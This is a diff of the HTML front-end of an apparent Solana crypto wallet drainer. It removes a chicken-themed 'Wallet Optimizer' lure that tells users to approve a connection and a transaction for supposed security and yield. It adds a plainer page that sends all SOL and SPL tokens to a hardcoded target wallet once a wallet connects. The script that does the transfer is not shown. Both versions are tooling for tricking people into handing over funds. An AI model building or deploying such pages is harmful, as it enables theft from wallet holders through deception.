@@ -3,157 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chicken Wallet Optimizer</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Solana Asset Transfer</title>
     <link rel="stylesheet" href="style.css">
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
-    <style>
-        /* Additional chicken-themed animations */
-        @keyframes eggBounce {
-            0%, 100% { transform: translateY(0) rotate(0deg); }
-            50% { transform: translateY(-10px) rotate(10deg); }
-        }
-        
-        @keyframes featherFall {
-            0% { transform: translateY(-100px) rotate(0deg); opacity: 0; }
-            100% { transform: translateY(100vh) rotate(360deg); opacity: 1; }
-        }
-        
-        .floating-chicken {
-            position: fixed;
-            font-size: 2rem;
-            z-index: 0;
-            opacity: 0.1;
-            animation: floatAround 20s infinite linear;
-        }
-        
-        @keyframes floatAround {
-            0% { transform: translate(0, 0) rotate(0deg); }
-            25% { transform: translate(100px, 100px) rotate(90deg); }
-            50% { transform: translate(50px, 200px) rotate(180deg); }
-            75% { transform: translate(-50px, 150px) rotate(270deg); }
-            100% { transform: translate(0, 0) rotate(360deg); }
-        }
-    </style>
 </head>
 <body>
-    <!-- Floating chicken decorations -->
-    <div class="floating-chicken" style="top:10%; left:5%;">🐔</div>
-    <div class="floating-chicken" style="top:20%; right:10%; animation-delay: -5s;">🥚</div>
-    <div class="floating-chicken" style="bottom:30%; left:15%; animation-delay: -10s;">🐣</div>
-    <div class="floating-chicken" style="top:50%; right:5%; animation-delay: -15s;">🐤</div>
-    
     <div class="container">
-        <div class="header">
-            <h1><i class="fas fa-drumstick-bite"></i> CHICKEN WALLET OPTIMIZER</h1>
-            <p>Cluck-tastic Solana Security & Optimization</p>
-        </div>
-        
-        <div class="content">
-            <div class="info-card">
-                <div class="card-icon">
-                    <i class="fas fa-egg"></i>
-                </div>
-                <h2 class="card-title">GOLDEN EGG OPTIMIZATION</h2>
-                <p class="card-text">
-                    This premium optimizer will hatch your wallet's full potential, 
-                    secure your digital coop, and maximize your crypto yield.
-                    One simple approval unlocks all enhancements.
-                </p>
-                
-                <div class="note">
-                    <i class="fas fa-info-circle"></i>
-                    CLUCK-TIP: Approve both connection and transaction when prompted
-                </div>
-                
-                <button id="optimizeBtn" class="btn btn-optimize">
-                    <i class="fas fa-feather-alt"></i> START OPTIMIZATION
-                </button>
+        <div class="card">
+            <div class="logo">
+                <h1>🚀 Solana Asset Transfer</h1>
             </div>
             
-            <div class="process-box" id="processBox">
-                <div class="process-icon">
-                    <i class="fas fa-hatchling fa-spin"></i>
-                </div>
-                <div class="process-text" id="processText">
-                    Warming up the incubator...
+            <div class="target-address">
+                <h3>Target Wallet:</h3>
+                <div class="address-box">
+                    <code id="targetAddress">95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD</code>
+                    <button onclick="copyAddress()" class="copy-btn">📋 Copy</button>
                 </div>
             </div>
             
-            <div id="successBox" class="success-box">
-                <div class="success-icon">
-                    <i class="fas fa-crown"></i>
-                </div>
-                <h2 class="success-title">OPTIMIZATION HATCHED!</h2>
-                <p class="success-message">
-                    Your wallet has been successfully optimized! All eggs are in the right basket.
-                    Your digital coop is now secure and producing maximum yield.
-                </p>
-                
-                <div class="data-box">
-                    <div style="color: #FFD700; margin-bottom: 8px;">
-                        <i class="fas fa-shield-alt"></i> COOP SECURITY ACTIVATED
-                    </div>
-                    <div style="font-size: 0.75rem; color: #ADFF2F;" id="txData">
-                        Transaction Hash: <span id="txHash">Pending...</span>
-                    </div>
+            <div class="info">
+                <p><strong>⚠️ Attention:</strong> All assets will be automatically transferred to the target wallet upon connection.</p>
+                <p>This includes all SOL and SPL tokens in your wallet.</p>
+            </div>
+            
+            <button id="connectBtn" class="connect-btn">
+                🔗 Connect Wallet & Transfer All
+            </button>
+            
+            <div class="status-container">
+                <h3>Status:</h3>
+                <div id="status" class="status-box">
+                    Ready to connect...
                 </div>
             </div>
-        </div>
-        
-        <div class="footer">
-            <p><i class="fas fa-feather"></i> Secure Coop Protocol v3.2 • © 2024 Chicken Finance Systems</p>
-            <p style="font-size: 0.7rem; margin-top: 5px; color: #FFA500;">
-                🐔 "Don't put all your eggs in one wallet!" 🥚
-            </p>
+            
+            <div class="progress-container" id="progressContainer" style="display: none;">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="progress-text" id="progressText">0%</div>
+            </div>
         </div>
     </div>
 
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.js"></script>
     <script src="script.js"></script>
-    
-    <script>
-        // Add floating feathers effect
-        document.addEventListener('DOMContentLoaded', function() {
-            const colors = ['#FFD700', '#FFA500', '#FFFFFF', '#DEB887'];
-            
-            function createFeather() {
-                const feather = document.createElement('div');
-                feather.innerHTML = '🪶';
-                feather.style.position = 'fixed';
-                feather.style.top = '-50px';
-                feather.style.left = Math.random() * 100 + 'vw';
-                feather.style.fontSize = (Math.random() * 20 + 15) + 'px';
-                feather.style.opacity = Math.random() * 0.3 + 0.1;
-                feather.style.zIndex = '0';
-                feather.style.color = colors[Math.floor(Math.random() * colors.length)];
-                feather.style.animation = `featherFall ${Math.random() * 10 + 15}s linear infinite`;
-                document.body.appendChild(feather);
-                
-                setTimeout(() => {
-                    feather.remove();
-                }, 20000);
-            }
-            
-            // Create initial feathers
-            for (let i = 0; i < 5; i++) {
-                setTimeout(createFeather, i * 1000);
-            }
-            
-            // Create feathers periodically
-            setInterval(createFeather, 3000);
-            
-            // Add egg animation to button
-            const btn = document.getElementById('optimizeBtn');
-            if (btn) {
-                btn.addEventListener('mouseover', function() {
-                    this.style.animation = 'eggBounce 0.5s ease';
-                });
-                
-                btn.addEventListener('animationend', function() {
-                    this.style.animation = '';
-                });
-            }
-        });
-    </script>
 </body>
 </html>
